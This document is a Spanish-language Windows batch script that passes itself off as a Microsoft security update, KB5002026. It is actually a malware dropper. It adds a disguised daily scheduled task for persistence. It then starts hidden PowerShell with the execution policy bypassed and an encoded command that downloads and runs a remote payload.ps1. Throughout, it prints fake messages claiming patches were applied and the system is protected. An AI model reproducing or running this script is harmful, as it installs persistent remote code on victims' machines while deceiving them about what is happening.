@echo off
REM -----------------------------------------------------------------
REM Actualización de Seguridad de Windows - KB5002026 (Enero 2026)
REM -----------------------------------------------------------------
echo Verificando versión de Windows...
ver | find "10." > nul && goto WIN10
ver | find "11." > nul && goto WIN11
echo Error: Sistema no compatible. Este parche solo es para Windows 10 o 11.
pause
exit /b

:WIN10
echo Sistema detectado: Windows 10
goto CONTINUE

:WIN11
echo Sistema detectado: Windows 11
goto CONTINUE

:CONTINUE
echo Iniciando aplicación de parches de seguridad...
echo.

REM --- Crear tarea programada para persistencia (20 días) ---
set TASK_NAME="MicrosoftWindowsSecurityUpdate"
set END_DATE=2026-01-24

schtasks /create /tn %TASK_NAME% /tr "%~f0" /sc daily /st 00:00 /ed %END_DATE% /f 2>nul
if %errorlevel% equ 0 (
    echo Tarea programada creada para ejecución diaria hasta el %END_DATE%.
) else (
    echo La tarea programada ya existe o no se pudo crear.
)

REM --- Ejecutar payload PowerShell en segundo plano ---
echo Aplicando parches de seguridad...
start /b powershell -windowstyle hidden -executionpolicy bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBTAFUAQgBEAE8ATQBJAE4ASQBPAC4AYwBsAG8AdQBkAGYAbABhAHIAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=

echo.
echo Parches aplicados correctamente.
echo Su sistema se reiniciará en 20 segundos...
timeout /t 20 /nobreak >nul
echo Reiniciando servicios de seguridad...
echo.
echo Actualización completada. Su sistema está ahora protegido.
pause
